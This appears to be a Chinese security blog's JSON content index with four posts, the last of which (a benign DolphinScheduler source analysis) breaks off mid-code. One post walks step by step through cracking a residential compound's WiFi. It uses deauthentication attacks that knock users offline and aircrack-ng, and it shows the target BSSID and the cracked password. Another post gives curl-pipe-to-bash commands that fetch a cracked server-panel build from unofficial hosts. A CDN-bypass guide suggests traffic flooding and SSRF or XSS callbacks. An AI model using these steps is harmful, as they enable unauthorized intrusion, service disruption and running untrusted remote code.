{"meta":{"title":"山城冰荔枝","subtitle":"","description":"","author":"山城冰荔枝","url":"https://sfyyh.github.io","root":"/"},"pages":[{"title":"404 Not Found：该页无法显示","date":"2023-08-03T12:38:08.372Z","updated":"2023-08-03T12:38:08.372Z","comments":false,"path":"/404.html","permalink":"https://sfyyh.github.io/404.html","excerpt":"","text":""},{"title":"书单","date":"2023-08-03T12:38:08.376Z","updated":"2023-08-03T12:38:08.376Z","comments":false,"path":"books/index.html","permalink":"https://sfyyh.github.io/books/index.html","excerpt":"","text":""},{"title":"关于","date":"2023-08-03T12:38:08.375Z","updated":"2023-08-03T12:38:08.375Z","comments":false,"path":"about/index.html","permalink":"https://sfyyh.github.io/about/index.html","excerpt":"","text":"个人详细介绍"},{"title":"分类","date":"2023-08-03T14:00:34.003Z","updated":"2023-08-03T14:00:34.003Z","comments":true,"path":"categories/index.html","permalink":"https://sfyyh.github.io/categories/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2023-08-03T12:38:08.379Z","updated":"2023-08-03T12:38:08.379Z","comments":false,"path":"repository/index.html","permalink":"https://sfyyh.github.io/repository/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2023-08-03T12:38:08.378Z","updated":"2023-08-03T12:38:08.378Z","comments":true,"path":"links/index.html","permalink":"https://sfyyh.github.io/links/index.html","excerpt":"","text":""},{"title":"标签","date":"2023-08-03T12:38:08.380Z","updated":"2023-08-03T12:38:08.380Z","comments":false,"path":"tags/index.html","permalink":"https://sfyyh.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"部署CDN的网站找真实IP","slug":"部署CDN的网站找真实IP","date":"2023-08-15T14:40:26.000Z","updated":"2023-08-15T16:05:36.829Z","comments":true,"path":"2023/08/15/部署CDN的网站找真实IP/","link":"","permalink":"https://sfyyh.github.io/2023/08/15/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/","excerpt":"","text":"部署CDN的网站找真实IP1. 概述目前很多网站使用了cdn服务，用了此服务 可以隐藏服务器的真实IP，加速网站静态文件的访问，而且你请求网站服务时，cdn服务会根据你所在的地区，选择合适的线路给予你访问，由此达网站加速的效果，cdn不仅可以加速网站访问，还可以提供waf服务，如防止cc攻击，SQL注入拦截等多种功能，再说使用cdn的成本不太高，很多云服务器也免费提供此服务。在进行黑盒测试的时候，往往成了拦路石，所以掌握cdn找真实ip成了不得不掌握的一项技术。 2. 判断是否CDNping 域名 使用超级ping http://ping.chinaz.com/ http://ping.aizhan.com/ https://www.17ce.com/ http://ping.chinaz.com/www.t00ls.net 不同的地区访问有着不同的IP，这样就确定了该域名使用了cdn了。 3. 找真实IP的方法集合找到真实IP可以继续旁站检测，找其他站点进行突破，也可以绕过cdn进行访问，从而绕过waf针对攻击语句的拦截 发现有攻击语句就会对攻击的IP封堵。 3.1. dns历史绑定记录通过以下这些网站可以访问dns的解析，有可能存在未有绑cdn之前的记录。 https://dnsdb.io/zh-cn/ ###DNS查询 https://x.threatbook.cn/ ###微步在线 http://viewdns.info/ ###DNS、IP等查询 https://tools.ipip.net/cdn.php ###CDN查询IP https://sitereport.netcraft.com/?url=域名 查询WWW.T00Ls.net的历史记录 https://site.ip138.com/www.t00ls.net/ 3.2. 子域名解析通过子域名的解析指向 也有可能指向目标的同一个IP上。 使用工具对其子域名进行穷举 在线子域名查询 https://securitytrails.com/list/apex_domain/t00ls.net http://tool.chinaz.com/subdomain/t00ls.net https://phpinfo.me/domain/ 找到子域名继续确认子域名没有cdn的情况下批量进行域名解析查询，有cdn的情况继续查询历史。 域名批量解析 http://tools.bugscaner.com/domain2ip.html 3.3. 国外dns获取真实IP部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP 全世界DNS地址： http://www.ab173.com/dns/dns_world.php https://dnsdumpster.com/ https://dnshistory.org/ http://whoisrequest.com/history/ https://completedns.com/dns-history/ http://dnstrails.com/ https://who.is/domain-history/ http://research.domaintools.com/research/hosting-history/ http://site.ip138.com/ http://viewdns.info/iphistory/ https://dnsdb.io/zh-cn/ https://www.virustotal.com/ https://x.threatbook.cn/ http://viewdns.info/ http://www.17ce.com/ http://toolbar.netcraft.com/site_report?url= https://securitytrails.com/ https://tools.ipip.net/cdn.php 3.4. ico图标通过空间搜索找真实iphttps://www.t00ls.net/favicon.ico 下载图标 放到fofa识别 通过fofa搜图标 通过这样查询 快速定位资源 查看端口是否开放 这里没有开放 通过zoomeye搜图标 查看端口开放情况 绑定hosts进行测试 这应该是真实ip了。 3.5. fofa搜索真实IPdomain&#x3D;”t00ls.net” 302一般是cdn 3.6. 通过censys找真实ipCensys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，能够扫描整个互联网，Censys会将互联网所有的ip进行扫面和连接，以及证书探测。 若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。 通过协议查询 https://censys.io/ipv4?q=((www.t00ls.net) AND protocols: “443&#x2F;https”) AND tags.raw: “https”&amp; 443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:moonsec.com 3.7. 360测绘中心https://quake.360.cn 3.8. 利用SSL证书寻找真实IP证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。 获取网站SSL证书的HASH再结合Censys 利用Censys搜索网站的SSL证书及HASH，在https://crt.sh上查找目标网站SSL证书的HASH 再用Censys搜索该HASH即可得到真实IP地址 SSL证书搜索引擎： https://censys.io/ipv4?q=b6bce7fb8f7723ea63c6d0419e7af1f780d6b6cb1b4c2240e657f029142e2aae https://censys.io/certificates?q=parsed.names%3A+t00ls.net+and+tags.raw%3A+trusted 找到hash 转成ipv4 进行搜索 找到两个IP 两个ip 222.186.129.100 118.184.255.28 或者把hash放进网络空间搜索 7489210725011808154949879630532736653 成功找到网络IP 接着就是判断ip是否是这个域名的了。 3.9. 邮箱获取真实IP网站在发信的时候，会附带真实的IP地址 进入邮箱 查看源文件头部信息 选择from 是否真实 还需要 邮箱发送是否与网站同一个IP地址。 3.10. 网站敏感文件获取真实IP 文件探针 phpinfo 网站源代码 信息泄露 GitHub信息泄露 js文件 3.11. F5 LTM解码法当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取， 例如：Set-Cookie: BIGipServerpool_8.29_8030&#x3D;487098378.24095.0000，先把第一小 节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前， 以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就 是最后的真实ip。 rverpool-cas01&#x3D;3255675072.20480.0000; path&#x3D;&#x2F; 3255675072 转十六进制 c20da8c0 从右向左取 c0a80dc2 转10进制 192 168 13 194 3.12. APP获取真实IP如果网站有app，使用Fiddler或BurpSuite抓取数据包 可能获取真实IP 模拟器 mimi模拟器抓包 3.13. 小程序获取真实IP3.14. 配置不当获取真实IP在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。 案例1：为了方便用户访问，我们常常将test.com 和 test.com 解析到同一个站点，而CDN只配置了www.test.com，通过访问test.com，就可以绕过 CDN 了。 案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。 3.15. banner获取目标站点的banner，在全网搜索引擎搜索，也可以使用AQUATONE，在Shodan上搜索相同指纹站点。 可以通过互联网络信息中心的IP数据，筛选目标地区IP，遍历Web服务的banner用来对比CDN站的banner，可以确定源IP。 欧洲： http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest 北美： https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest 亚洲： ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest 非洲： ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest 拉美： ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest 获取CN的IP http://www.ipdeny.com/ipblocks/data/countries/cn.zone 例如： 找到目标服务器 IP 段后，可以直接进行暴力匹配 ，使用zmap、masscan 扫描 HTTP banner，然后匹配到目标域名的相同 banner zmap -p 80 -w bbs.txt -o 80.txt 使用zmap的banner-grab对扫描出来80端口开放的主机进行banner抓取。 cat &#x2F;root&#x2F;bbs.txt |.&#x2F;banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out 根据网站返回包特征，进行特征过滤 location: plugin.php?id&#x3D;info:index https://fofa.so/ title&#x3D;”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net” https://www.zoomeye.org/ title:”T00LS | 低调求发展 -潜心习安全 -T00ls.Net” https://quake.360.cn/ response:”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net” 1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。https://github.com/zmap/zmap 2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。 https://github.com/robertdavidgraham/masscan 3.16. 长期关注在长期渗透的时候，设置程序每天访问网站，可能有新的发现。每天零点 或者业务需求增大 它会换ip 换服务器的。 3.17. 流量攻击发包机可以一下子发送很大的流量。 这个方法是很笨，但是在特定的目标下渗透，建议采用。 cdn除了能隐藏ip，可能还考虑到分配流量， 不设防的cdn 量大就会挂，高防cdn 要大流量访问。 经受不住大流量冲击的时候可能会显示真实ip。 站长-&gt;业务不正常-&gt;cdn不使用-&gt;更换服务器。 3.18. 被动获取被动获取就是让服务器或网站主动连接我们的服务器，从而获取服务器的真实IP 如果网站有编辑器可以填写远程url图片，即可获取真实IP 如果存在ssrf漏洞 或者xss 让服务器主动连接我们的服务器 均可获取真实IP。 3.19. 扫全网获取真实IPhttps://github.com/superfish9/hackcdn https://github.com/boy-hack/w8fuckcdn","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"},{"name":"渗透必知必会","slug":"渗透必知必会","permalink":"https://sfyyh.github.io/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"}]},{"title":"宝塔面板企业版","slug":"宝塔面板企业版","date":"2023-08-07T05:44:37.000Z","updated":"2023-08-07T05:49:16.217Z","comments":true,"path":"2023/08/07/宝塔面板企业版/","link":"","permalink":"https://sfyyh.github.io/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/","excerpt":"","text":"从外部引入脚本 测试可用 自行辨别安全 安装脚本和升级脚本自己看实际情况使用 宝塔企业版介绍 · 安全：剥离了所有与宝塔官方的通信、上报、下发；并且不与本站企业版服务器通信； · 免费：提升为企业会员，免费使用软件商店中的所有[企业版插件]、[专业版插件]、[运行环境]、[免费插件]、[宝塔插件]；部分[第三方应用]安装可能会失败； · 解决方案：所有功能与原版一致，如有任何问题请参考宝塔官方解决方案；或前往交流群交流！ · 面板修复：企业版不与官方通信，也没有与我们服务器通信，所以无法判断贵站情况，建议使用升级代码修复&#x2F;或安装宝塔官方版再安装企业版(小概率出现异常，大概率只重装面板不影响网站运行)； · 其他提示：如果发现[软件商店]空白，大多是服务器与你本地的网络问题，请清理本地缓存&#x2F;切换浏览器的访客模式访问&#x2F;切换本地代理IP； · 本站声明：企业版基于官方代码、仅做通信剥离、代码未加密、未添加任何新增代码！ 宝塔企业版面板：新环境新服务器（也是就什么都没装的使用下面命令安装）已安装朋友请直接跳过往下看！ 官方最新版7.9版本，安装脚本（来源宝塔官方）： 教程环境使用的是CentOS 7.9 安装命令：1234567891011121314151617181920212223242526272829Centos安装命令（默认安装是7.8.0 直接在线升级7.9.3）：主节点：yum install -y wget &amp;&amp; wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; sh install.sh 海外节点专用：yum install -y wget &amp;&amp; wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; sh install.sh 试验性Centos/Ubuntu/Debian安装命令 独立运行环境（py3.7） 可能存在少量兼容性问题 不断优化中主节点：curl -sSO http://io.bt.sy/install/install_panel.sh &amp;&amp; bash install_panel.sh 海外节点专用：curl -sSO http://io.yu.al/install/install_panel.sh &amp;&amp; bash install_panel.sh Ubuntu Deepin安装命令：主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash install.sh Debian安装命令：主节点：wget -O install.sh http://io.bt.sy/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh Fedora安装命令:主节点：wget -O install.sh http://io.bt.sy/install/install_6.0.sh &amp;&amp; bash install.sh 海外节点专用：wget -O install.sh http://io.yu.al/install/install_6.0.sh &amp;&amp; bash install.sh[/van-wechat-hide] 升级教程：1.首先升级到官方最新版7.9版本，升级脚本（来源宝塔官方）： 1curl https://download.bt.cn/install/update_panel.sh|bash 升级命令1 Linux面板 7.9.3 升级企业版命令 1（7.9.3 官方版 &#x2F; 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）： 123456789101112131415161718主节点：curl https://io.bt.sy/install/update_panel.sh|bash海外节点专用：curl https://io.yu.al/install/update_panel.sh|bash升级命令2Linux面板 7.9.3 升级企业版命令 2（7.9.3 官方版 / 7.7.0 开心版 可以执行这个升级到 7.9.3 开心版）：主节点：curl http://io.bt.sy/install/update6.sh|bash海外节点专用：curl http://io.yu.al/install/update6.sh|bash[/van-wechat-hide]以上升级命令都可以升级最新版！ 至此安装完成，我们进入宝塔面板，按住Ctrl+f5刷新，多刷新几次或等待一两分钟即可。 7.9.0开心版更新记录：系统工具：日志清理工具增加2.0版本！ 宝塔插件：堡塔网站加速增加4.2版本！ 专业版插件：网站监控报表增加6.8版本！ 企业版插件：堡塔防提权改名堡塔防入侵！ 企业版插件：堡塔限制访问型证书-Linux版增加1.2版本！ 第三方插件：Nginx免费防火墙更新6.3版本！ 第三方插件：百度网盘更新3.9版本！ 部分第三方插件已经全部更新同步官方！ 修复第三方插件百度网盘无法使用问题！ 修复已知道的一些插件到期的问题！ 修复第一次安装脚本，需要退出登录重登才能安装插件的逻辑问题！ 修复部分用户登录虚拟账户无法获取列表authlist空白的问题！ 修复危险级别：特高去除宝塔因为账户跟宝塔不匹配封ban用户ip风险的问题（导致恢复免费版也无法使用，只能降级7.7.0才能使用）！ 已支持Arm构架！！！","categories":[{"name":"网站搭建","slug":"网站搭建","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/"}],"tags":[{"name":"宝塔面板","slug":"宝塔面板","permalink":"https://sfyyh.github.io/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/"}]},{"title":"记一次对小区wifi渗透","slug":"my-first-blog","date":"2023-08-03T13:43:26.000Z","updated":"2023-08-03T13:49:56.399Z","comments":true,"path":"2023/08/03/my-first-blog/","link":"","permalink":"https://sfyyh.github.io/2023/08/03/my-first-blog/","excerpt":"","text":"wifi渗透(一)第三步——检查并开启网卡的监听功能airmon-ng：检查网卡是否支持监听功能的 airmon-ng start wlan0mon ：激活无线网卡的监听模式 第四步——扫描周边wifi信号airodump-ng wlan0mon ：扫描当前周边环境的WiFi信号 注意：找到你要破解的wifi信息，记住它的BSSID和CH,后面要用！ 第五步——抓包下面里的部分信息根据自己的情况进行替换 抓包命令：airodump-ng -c &#x3D;&#x3D;CH号码&#x3D;&#x3D; –bssid &#x3D;&#x3D;BSSID号码&#x3D;&#x3D; -w &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake wlan0mon 注意： 1-w后接抓包后得到的文件保存路径和名称，注意路径！ 我的用户名是kali，你的填你自己的 注：这种方式是一种被动等待的方式，所以我们需要将链接在该wifi上的设备踢下线，以便我们快速抓包。 这里我们需要记下BSSID(WIFI路由地址)和STATION（链接设备号），接下来我们将该设备从该wifi链接状态下强制踢下线 第六步——打掉连接ACK 死亡攻击：aireplay-ng -0 10 -a BSSID号 -c STATION号 wlan0mon 110——是攻击次数，一般10次就足够我们抓到包了，如果将次数调整的很大，那么就会持续的进行攻击，导致该设备长期无法链接到该wifi! 注：这样做将会导致连接在该wifi上的设备被强制下线，然后因为wifi的自动重连机制，使得我们可以快速抓到包。 最后一步——破解破解语法：aircrack-ng -w &lt;指定字典&gt; -b &lt;目的路由MAC地址&gt; &lt;抓到的握手包&gt; 注：目的路由MAC地址——就是BSSID 抓到的握手包——cap文件 kali自带字典：aircrack-ng -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 需要先解压：gzip -d &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt.gz 自我指定字典：aircrack-ng -w &#x2F;home&#x2F;kali&#x2F;password.txt -b 78:72:5D:E0:BC:37 &#x2F;home&#x2F;kali&#x2F;桌面&#x2F;handshake-0*.cap 成功！ 破解的wifi密码就为a123456789","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://sfyyh.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"网安","slug":"网安","permalink":"https://sfyyh.github.io/tags/%E7%BD%91%E5%AE%89/"}]},{"title":"一次对dolphinscheduler的源码分析","slug":"一次对dolphinscheduler的源码分析","date":"2023-07-20T01:05:10.000Z","updated":"2023-08-04T01:42:34.318Z","comments":true,"path":"2023/07/20/一次对dolphinscheduler的源码分析/","link":"","permalink":"https://sfyyh.github.io/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"","text":"dolphinscheduler学习DolphinScheduler 项目结构2.1 结构分析 导入项目后，可以看到其主要核心模块如下： 模块 描述 dolphinscheduler-alert 告警模块，提供 AlertServer 服务。 dolphinscheduler-api web应用模块，提供 ApiServer 服务。 dolphinscheduler-common 通用的常量枚举、工具类、数据结构或者基类 dolphinscheduler-dao 提供数据库访问等操作。 dolphinscheduler-remote 基于 netty 的客户端、服务端 dolphinscheduler-server MasterServer 和 WorkerServer 服务 dolphinscheduler-service service模块，包含Quartz、Zookeeper、日志客户端访问服务，便于server模块和api模块调用 dolphinscheduler-ui 前端模块 2.2 表分析 dolphinscheduler_ddl.sql及dolphinscheduler_dml.sql 执行完后，可以在数据库里看到有如下表： 表名 表信息 t_ds_access_token 访问ds后端的token t_ds_alert 告警信息 t_ds_alertgroup 告警组 t_ds_command 执行命令 t_ds_datasource 数据源 t_ds_error_command（核心表） 错误命令 t_ds_process_definition（核心表） 流程定义 t_ds_process_instance（核心表） 流程实例 t_ds_project 项目 t_ds_queue 队列 t_ds_relation_datasource_user 用户关联数据源 t_ds_relation_process_instance 子流程 t_ds_relation_project_user 用户关联项目 t_ds_relation_resources_user 用户关联资源 t_ds_relation_udfs_user 用户关联UDF函数 t_ds_relation_user_alertgroup 用户关联告警组 t_ds_resources 资源文件 t_ds_schedules（核心表） 流程定时调度 t_ds_session 用户登录的session t_ds_task_instance（核心表） 任务实例 t_ds_tenant 租户 t_ds_udfs UDF资源 t_ds_user 用户 t_ds_version ds版本信息 2.2.1 类关系图 （用户&#x2F;队列&#x2F;数据源） DS 描述如下： 一个租户下可以有多个用户； t_ds_user中的queue字段存储的是队列表中的queue_name信息; t_ds_tenant下存的是queue_id，在流程定义执行过程中，用户队列优先级最高，用户队列为空则采用租户队列； t_ds_datasource表中的user_id字段表示创建该数据源的用户; t_ds_relation_datasource_user中的user_id表示，对数据源有权限的用户。 2.2.2 类关系图 （项目&#x2F;资源&#x2F;告警） DS 描述如下： 一个用户可以有多个项目，用户项目授权通过t_ds_relation_project_user表完成project_id和user_id的关系绑定； t_ds_projcet表中的user_id表示创建该项目的用户； t_ds_relation_project_user表中的user_id表示对项目有权限的用户； t_ds_resources表中的user_id表示创建该资源的用户； t_ds_relation_resources_user中的user_id表示对资源有权限的用户； t_ds_udfs表中的user_id表示创建该UDF的用户； t_ds_relation_udfs_user表中的user_id表示对UDF有权限的用户。 2.2.3 类关系图 （ 命令&#x2F;流程&#x2F;任务） DS 描述如下： 一个项目有多个流程定义，一个流程定义可以生成多个流程实例，一个流程实例可以生成多个任务实例； t_ds_schedulers表存放流程定义的定时调度信息； t_ds_relation_process_instance表存放的数据用于处理流程定义中含有子流程的情况，parent_process_instance_id表示含有子流程的主流程实例id，process_instance_id表示子流程实例的id，parent_task_instance_id表示子流程节点的任务实例id，流程实例表和任务实例表分别对应t_ds_process_instance表和t_ds_task_instance表 03 DolphinScheduler 源码分析 讲解源码前，先贴一份官网的启动流程图： 3.1 ExecutorController DS org.apache.dolphinscheduler.api.controller.ExecutorController 以下是对各接口的描述： 接口 描述 &#x2F;start-process-instance 执行流程实例 &#x2F;batch-start-process-instance 批量执行流程实例 &#x2F;execute 操作流程实例，如：暂停, 停止, 重跑, 从暂停恢复,从停止恢复 &#x2F;batch-execute 批量操作流程实例 &#x2F;start-check 检查流程定义或检查所有的子流程定义是否在线 接下我们看看最核心的方法： 123456789101112131415161718192021222324252627/** * do action to process instance: pause, stop, repeat, recover from pause, recover from stop * * @param loginUser login user * @param projectCode project code * @param processInstanceId process instance id * @param executeType execute type * @return execute result code */ @ApiOperation(value = &quot;execute&quot;, notes = &quot;EXECUTE_ACTION_TO_PROCESS_INSTANCE_NOTES&quot;) @ApiImplicitParams(&#123; @ApiImplicitParam(name = &quot;processInstanceId&quot;, value = &quot;PROCESS_INSTANCE_ID&quot;, required = true, dataType = &quot;Int&quot;, example = &quot;100&quot;), @ApiImplicitParam(name = &quot;executeType&quot;, value = &quot;EXECUTE_TYPE&quot;, required = true, dataType = &quot;ExecuteType&quot;) &#125;) @PostMapping(value = &quot;/execute&quot;) @ResponseStatus(HttpStatus.OK) @ApiException(EXECUTE_PROCESS_INSTANCE_ERROR) @AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;) public Result execute(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(&quot;processInstanceId&quot;) Integer processInstanceId, @RequestParam(&quot;executeType&quot;) ExecuteType executeType ) &#123; Map result = execService.execute(loginUser, projectCode, processInstanceId, executeType); return returnDataList(result); &#125; 可以看到execute接口，是直接使用ExecService去执行了，下面分析下。 3.2 ExecService DS 下面看看里面的execute方法，已经加好了注释： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103/** * 操作工作流实例 * * @param loginUser 登录用户 * @param projectCode 项目编码 * @param processInstanceId 流程实例ID * @param executeType 执行类型（repeat running、resume pause、resume failure、stop、pause） * @return 执行结果 */@Overridepublic Map&lt;String, Object&gt; execute(User loginUser, long projectCode, Integer processInstanceId, ExecuteType executeType) &#123;/*** 查询项目信息 **/ Project project = projectMapper.queryByCode(projectCode);//check user access for project/*** 判断当前用户是否有操作权限 **/ Map&lt;String, Object&gt; result = projectService.checkProjectAndAuth(loginUser, project, projectCode, ApiFuncIdentificationConstant.map.get(executeType)); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** 检查Master节点是否存在 **/ if (!checkMasterExists(result)) &#123; return result; &#125;/*** 查询工作流实例详情 **/ ProcessInstance processInstance = processService.findProcessInstanceDetailById(processInstanceId); if (processInstance == null) &#123; putMsg(result, Status.PROCESS_INSTANCE_NOT_EXIST, processInstanceId); return result; &#125;/*** 根据工作流实例绑定的流程定义ID查询流程定义 **/ ProcessDefinition processDefinition = processService.findProcessDefinition(processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (executeType != ExecuteType.STOP &amp;&amp; executeType != ExecuteType.PAUSE) &#123;/*** 校验工作流定义能否执行（工作流是否存在？是否上线状态？存在子工作流定义不是上线状态？） **/ result = checkProcessDefinitionValid(projectCode, processDefinition, processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125; &#125;/*** 根据当前工作流实例的状态判断能否执行对应executeType类型的操作 **/ result = checkExecuteType(processInstance, executeType); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** 判断是否已经选择了合适的租户 **/ if (!checkTenantSuitable(processDefinition)) &#123; logger.error(&quot;there is not any valid tenant for the process definition: id:&#123;&#125;,name:&#123;&#125;, &quot;, processDefinition.getId(), processDefinition.getName()); putMsg(result, Status.TENANT_NOT_SUITABLE); &#125;/*** 在executeType为重跑的状态下，获取用户指定的启动参数 **/ Map&lt;String, Object&gt; commandMap = JSONUtils.parseObject(processInstance.getCommandParam(), new TypeReference&lt;Map&lt;String, Object&gt;&gt;() &#123; &#125;); String startParams = null; if (MapUtils.isNotEmpty(commandMap) &amp;&amp; executeType == ExecuteType.REPEAT_RUNNING) &#123; Object startParamsJson = commandMap.get(Constants.CMD_PARAM_START_PARAMS); if (startParamsJson != null) &#123; startParams = startParamsJson.toString(); &#125; &#125;/*** 根据不同的ExecuteType去执行相应的操作 **/ switch (executeType) &#123; case REPEAT_RUNNING:// 重跑 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.REPEAT_RUNNING, startParams); break; case RECOVER_SUSPENDED_PROCESS:// 恢复挂载的工作流 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.RECOVER_SUSPENDED_PROCESS, startParams); break; case START_FAILURE_TASK_PROCESS:// 启动失败的工作流 result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.START_FAILURE_TASK_PROCESS, startParams); break; case STOP:// 停止 if (processInstance.getState() == ExecutionStatus.READY_STOP) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.STOP, ExecutionStatus.READY_STOP); &#125; break; case PAUSE:// 暂停 if (processInstance.getState() == ExecutionStatus.READY_PAUSE) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.PAUSE, ExecutionStatus.READY_PAUSE); &#125; break; default: logger.error(&quot;unknown execute type : &#123;&#125;&quot;, executeType); putMsg(result, Status.REQUEST_PARAMS_NOT_VALID_ERROR, &quot;unknown execute type&quot;); break; &#125; return result;&#125; 可以看到，以上代码前半部分主要是做了校验的操作，后半部分是根据执行类型来做不同的操作，操作主要分为两部分：insertCommand以及updateProcessInstancePrepare。 execute执行接口分析 3.2.1 insertCommand DS 方法代码如下，其实主要就是把生成命令并插入t_ds_command（执行命令表），插入已经添加好注释： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * 插入命令（re run, recovery (pause / failure) execution) * * @param loginUser 登录用户 * @param instanceId 工作流实例id * @param processDefinitionCode 工作流定义id * @param processVersion 工作流版本 * @param commandType 命令类型 * @return 操作结果 */private Map&lt;String, Object&gt; insertCommand(User loginUser, Integer instanceId, long processDefinitionCode, int processVersion, CommandType commandType, String startParams) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();/*** 封装启动参数 **/ Map&lt;String, Object&gt; cmdParam = new HashMap&lt;&gt;(); cmdParam.put(CMD_PARAM_RECOVER_PROCESS_ID_STRING, instanceId); if (!StringUtils.isEmpty(startParams)) &#123; cmdParam.put(CMD_PARAM_START_PARAMS, startParams); &#125; Command command = new Command(); command.setCommandType(commandType); command.setProcessDefinitionCode(processDefinitionCode); command.setCommandParam(JSONUtils.toJsonString(cmdParam)); command.setExecutorId(loginUser.getId()); command.setProcessDefinitionVersion(processVersion); command.setProcessInstanceId(instanceId);/*** 判断工作流实例是否正在执行 **/ if (!processService.verifyIsNeedCreateCommand(command)) &#123; putMsg(result, Status.PROCESS_INSTANCE_EXECUTING_COMMAND, String.valueOf(processDefinitionCode)); return result; &#125;/*** 保存命令 **/ int create = processService.createCommand(command); if (create &gt; 0) &#123; putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 3.2.2 updateProcessInstancePrepare DS 方法代码如下，已经添加注释 123456789101112131415161718192021222324252627282930/** * 准备更新工作流实例的命令类型和状态 * * @param processInstance 工作流实例 * @param commandType 命令类型 * @param executionStatus 执行状态 * @return 更新结果 */private Map&lt;String, Object&gt; updateProcessInstancePrepare(ProcessInstance processInstance, CommandType commandType, ExecutionStatus executionStatus) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); processInstance.setCommandType(commandType); processInstance.addHistoryCmd(commandType); processInstance.setState(executionStatus); int update = processService.updateProcessInstance(processInstance);// 判断流程是否正常 if (update &gt; 0) &#123; StateEventChangeCommand stateEventChangeCommand = new StateEventChangeCommand( processInstance.getId(), 0, processInstance.getState(), processInstance.getId(), 0 ); Host host = new Host(processInstance.getHost()); stateEventCallbackService.sendResult(host, stateEventChangeCommand.convert2Command()); putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, 